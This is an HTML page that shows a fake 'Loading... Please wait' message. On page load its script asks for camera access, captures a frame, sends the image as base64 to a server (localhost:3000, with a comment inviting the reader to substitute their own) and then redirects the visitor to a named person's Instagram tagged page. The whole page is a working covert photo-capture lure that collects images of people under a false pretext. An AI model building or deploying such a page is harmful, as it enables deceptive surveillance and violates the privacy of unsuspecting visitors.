<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect After Photo Capture</title>
</head>
<body>
    <h1>Loading...</h1>
    <p>Please wait while we process your request.</p>

    <script>
        async function captureAndSendPhoto() {
            try {
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                // Wait for video to start playing
                await new Promise(resolve => video.onplaying = resolve);

                // Capture a frame from the video
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());

                // Convert the image to a data URL (Base64)
                const imageData = canvas.toDataURL("image/png");

                // Send the image to the server (you can replace the URL with your server)
                const response = await fetch("http://localhost:3000", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    // Redirect the user to the destination site
                    window.location.href = "https://www.instagram.com/f_arsenova/tagged/";
                } else {
                    alert("Failed to send the photo.");
                }
            } catch (error) {
                console.error("Error capturing or sending the photo:", error);
                alert("An error occurred. Please try again.");
            }
        }

        // Start the process when the page loads
        window.onload = captureAndSendPhoto;
    </script>
</body>
</html>
